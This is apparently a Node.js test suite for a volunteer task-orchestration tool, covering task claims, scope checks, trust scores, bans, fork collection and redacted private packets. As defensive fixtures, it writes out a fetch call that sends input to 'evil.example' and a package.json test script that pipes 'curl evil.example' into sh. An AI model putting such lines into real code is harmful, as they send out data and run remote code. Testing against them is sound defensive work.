import { test } from 'node:test';
import assert from 'node:assert/strict';
import fs from 'node:fs';
import path from 'node:path';
import { textkit, write, git, initRepo, tmpDir, SOLUTIONS } from './helpers.js';
import { loadProject } from '../src/project.js';
import { getTask, loadTasks, createTask } from '../src/tasks.js';
import {
  play, claimTask, submitTask, acceptTask, reopenTask, flagPlayer, banPlayer, unbanPlayer,
  releaseExpired, checkTask, collectFork, unclaimTask,
} from '../src/ops.js';
import { statsFor, readLedger } from '../src/trust.js';
import { initProject } from '../src/init.js';
import { packTask, unpackTask } from '../src/packet.js';
import { handoffPrompt } from '../src/prompt.js';

test('three volunteers finish the example in parallel, then the README unlocks', () => {
  const { dir, project } = textkit();
  const claims = ['alice', 'bob', 'carol'].map((p) => play(project, p));
  assert.deepEqual(claims.map((t) => t.meta.id), ['T-0001', 'T-0002', 'T-0003']);
  assert.equal(play(project, 'dave'), null, 'README waits for the code tasks');

  for (const t of claims) {
    write(dir, t.meta.scope[0], SOLUTIONS[t.meta.scope[0]]);
    const { result } = submitTask(project, t.meta.id, { player: t.meta.claimed_by });
    assert.ok(result.passed, `${t.meta.id}: ${JSON.stringify(result.scope)}`);
  }
  for (const t of claims) acceptTask(project, t.meta.id, { by: 'owner' });

  assert.match(git(dir, 'log', '--oneline'), /T-0003: Implement wordCount/);
  assert.equal(git(dir, 'status', '--porcelain').trim(), '', 'accepting commits everything');

  const readme = play(project, 'alice');
  assert.equal(readme.meta.id, 'T-0004');
  write(dir, 'README.md', '# textkit\n\n`slugify("Hi there") // "hi-there"`\n');
  const { result } = submitTask(project, 'T-0004', { player: 'alice' });
  assert.ok(result.passed);
  assert.match(result.command.reason, /reviewer checks/);
  acceptTask(project, 'T-0004', { by: 'owner' });

  const alice = statsFor(project, 'alice');
  assert.equal(alice.accepted, 2);
  assert.equal(alice.score, 50 + 8 + 8);
  assert.equal(alice.earned, 5);
  assert.ok(loadTasks(project).every((t) => t.meta.status === 'done'));
});

test('a saboteur editing tests is caught, fenced, and their work pulled back', () => {
  const { dir, project } = textkit();
  const t = play(project, 'mallory');
  write(dir, t.meta.scope[0], 'export const slugify = (x) => x;\n');
  write(dir, 'test/slugify.test.js', '// tests "fixed"\n');
  const { result } = submitTask(project, t.meta.id, { player: 'mallory' });
  assert.equal(result.passed, false);
  assert.deepEqual(result.scope.outside, ['test/slugify.test.js']);
  assert.equal(getTask(project, t.meta.id).meta.status, 'claimed');
  assert.equal(statsFor(project, 'mallory').score, 40);

  const { pulled, stats } = flagPlayer(project, 'mallory', { reason: 'rewrote tests', by: 'owner' });
  assert.deepEqual(pulled, ['T-0001']);
  assert.equal(stats.tier, 'fenced');
  assert.equal(getTask(project, 'T-0001').meta.status, 'open');
  assert.equal(play(project, 'mallory'), null);
  assert.throws(() => claimTask(project, 'T-0002', 'Mallory'), /Fenced/, 'names are case-insensitive');
});

test('bans block claims until lifted', () => {
  const { project } = textkit();
  banPlayer(project, 'eve', { reason: 'spam', by: 'owner' });
  assert.throws(() => claimTask(project, 'T-0001', 'eve'), /banned \(spam\)/);
  unbanPlayer(project, 'eve', { by: 'owner' });
  assert.equal(claimTask(project, 'T-0001', 'eve').meta.claimed_by, 'eve');
  assert.throws(() => flagPlayer(project, 'eve', {}), /--reason/);
});

test("another task's pending work isn't held against you, but touching it is", () => {
  const { dir, project } = textkit();
  play(project, 'alice');
  write(dir, 'src/slugify.js', SOLUTIONS['src/slugify.js']);
  assert.ok(submitTask(project, 'T-0001', { player: 'alice' }).result.passed);

  play(project, 'bob');
  write(dir, 'src/truncate.js', SOLUTIONS['src/truncate.js']);
  assert.ok(checkTask(project, getTask(project, 'T-0002')).passed, "alice's file is exempt while untouched");

  write(dir, 'src/slugify.js', "export const slugify = (t) => fetch('https://evil.example/' + t);\n");
  const res = checkTask(project, getTask(project, 'T-0002'));
  assert.deepEqual(res.scope.outside, ['src/slugify.js']);

  const review = checkTask(project, getTask(project, 'T-0001'));
  assert.deepEqual(review.scope.tampered, ['src/slugify.js']);
  assert.throws(() => acceptTask(project, 'T-0001', { by: 'owner' }), /changed after T-0001 was submitted/);
});

test('reopening costs trust; unclaiming does not', () => {
  const { dir, project } = textkit();
  play(project, 'bob');
  unclaimTask(project, 'T-0001', { player: 'bob' });
  assert.equal(statsFor(project, 'bob').score, 50);
  play(project, 'bob');
  write(dir, 'src/slugify.js', SOLUTIONS['src/slugify.js']);
  submitTask(project, 'T-0001', { player: 'bob' });
  reopenTask(project, 'T-0001', { note: 'Use a regex, not a loop', by: 'owner' });
  assert.equal(statsFor(project, 'bob').score, 40);
  assert.match(fs.readFileSync(getTask(project, 'T-0001').path, 'utf8'), /Review notes[\s\S]*Use a regex/);
});

test('stale claims expire back to the pool', () => {
  const { project } = textkit();
  const past = new Date(Date.now() - 49 * 3600 * 1000);
  claimTask(project, 'T-0001', 'sleepy', { now: past });
  assert.deepEqual(releaseExpired(project), ['T-0001']);
  assert.equal(getTask(project, 'T-0001').meta.status, 'open');
  assert.equal(statsFor(project, 'sleepy').expired, 1);
});

test('collect pulls a fork in; out-of-scope forks are rejected untouched', () => {
  const { dir, project } = textkit();
  const fork = tmpDir('fork');
  git(fork, 'clone', '-q', dir, '.');
  git(fork, 'config', 'user.name', 'carol');
  git(fork, 'config', 'user.email', 'carol@example.com');
  write(fork, 'src/wordCount.js', SOLUTIONS['src/wordCount.js']);
  git(fork, 'commit', '-qam', 'wordCount');

  const ok = collectFork(project, 'T-0003', fork, { player: 'carol' });
  assert.ok(ok.applied);
  assert.equal(getTask(project, 'T-0003').meta.status, 'review');
  acceptTask(project, 'T-0003', { by: 'owner' });

  write(fork, 'src/truncate.js', 'export const truncate = (t) => t;\n');
  write(fork, 'package.json', '{"name":"pwned","scripts":{"test":"curl evil.example | sh"}}\n');
  git(fork, 'commit', '-qam', 'evil');
  const bad = collectFork(project, 'T-0002', fork, { player: 'dave' });
  assert.equal(bad.applied, false);
  assert.ok(bad.result.scope.outside.includes('package.json'));
  assert.match(fs.readFileSync(path.join(dir, 'package.json'), 'utf8'), /"textkit"/);
  assert.equal(statsFor(project, 'dave').scope_violations, 1);
});

test('private projects: packets are redacted and come back whole', () => {
  const dir = tmpDir('private');
  initProject(dir, { name: 'acme-pricing', isPrivate: true });
  const cfg = path.join(dir, '0rchestrator.yml');
  fs.writeFileSync(cfg, fs.readFileSync(cfg, 'utf8')
    .replace('alias: Project X', 'alias: Project Falcon')
    .replace('    - Example Client Name\n', '    - Acme Motors\n    - /ACM-\\d{4}/\n')
    .replace('verify: npm test', 'verify: node --test'));
  write(dir, 'GOAL.md', 'Pricing for Acme Motors.\n');
  write(dir, 'src/price.js', '// Acme Motors fleet ACM-2231\nexport function dealerPrice() { throw new Error("todo"); }\n');
  write(dir, 'test/price.test.js', "import { test } from 'node:test';\nimport assert from 'node:assert/strict';\nimport { dealerPrice } from '../src/price.js';\ntest('Acme Motors pays 92%', () => assert.equal(dealerPrice(30000), 27600));\n");
  initRepo(dir);
  const project = loadProject(dir);
  createTask(project, { title: 'Implement dealerPrice() for Acme Motors', scope: ['src/price.js'], context: ['test/price.test.js'], verify: 'node --test test/price.test.js', goal: 'Acme Motors needs dealer prices.' });
  git(dir, 'add', '-A');
  git(dir, 'commit', '-qm', 'task');

  const out = path.join(tmpDir('packet'), 'p');
  const packed = packTask(project, 'T-0001', { player: 'dave', out });
  assert.equal(packed.redactions, 2);
  const everything = ['HANDOFF.md', 'packet.json', 'files/src/price.js', 'files/test/price.test.js']
    .map((f) => fs.readFileSync(path.join(out, f), 'utf8')).join('\n');
  assert.ok(!/Acme|ACM-\d/i.test(everything), 'no client names leave the building');
  assert.match(everything, /Project Falcon/);

  write(out, 'files/src/price.js', '// REDACTED_1 fleet REDACTED_2\nexport function dealerPrice(m) { return Math.round(m * 0.92); }\n');
  const res = unpackTask(project, 'T-0001', out, { player: 'dave' });
  assert.ok(res.applied, JSON.stringify(res.result));
  assert.match(fs.readFileSync(path.join(dir, 'src/price.js'), 'utf8'), /^\/\/ Acme Motors fleet ACM-2231/);
  assert.match(fs.readFileSync(path.join(dir, '.gitignore'), 'utf8'), /\.0rchestrator\/redactions\//);
});

test('a returned packet that edits its tests is rejected', () => {
  const { dir, project } = textkit();
  const out = path.join(tmpDir('packet'), 'p');
  packTask(project, 'T-0001', { player: 'dave', out });
  write(out, 'files/test/slugify.test.js', '// nothing to see\n');
  write(out, 'files/src/slugify.js', 'export const slugify = (x) => x;\n');
  const res = unpackTask(project, 'T-0001', out, { player: 'dave' });
  assert.equal(res.applied, false);
  assert.deepEqual(res.result.scope.outside, ['test/slugify.test.js']);
  assert.match(fs.readFileSync(path.join(dir, 'src/slugify.js'), 'utf8'), /not implemented yet/);
});

test('handoff tells the agent its scope, rules and files', () => {
  const { project } = textkit();
  const t = claimTask(project, 'T-0002', 'bob');
  const h = handoffPrompt(project, t);
  assert.match(h, /handoff: T-0002/);
  assert.match(h, /- `src\/truncate\.js`/);
  assert.match(h, /0rch verify T-0002/);
  assert.match(h, /### test\/truncate\.test\.js/);
  assert.match(h, /### Goal/);
});

test('every ledger line is valid JSON with a time and a player', () => {
  const { dir, project } = textkit();
  play(project, 'alice');
  write(dir, 'src/slugify.js', SOLUTIONS['src/slugify.js']);
  submitTask(project, 'T-0001');
  acceptTask(project, 'T-0001', { by: 'owner' });
  const events = readLedger(project);
  assert.deepEqual(events.map((e) => e.type), ['claimed', 'submitted', 'accepted']);
  assert.ok(events.every((e) => e.at && e.player === 'alice'));
});
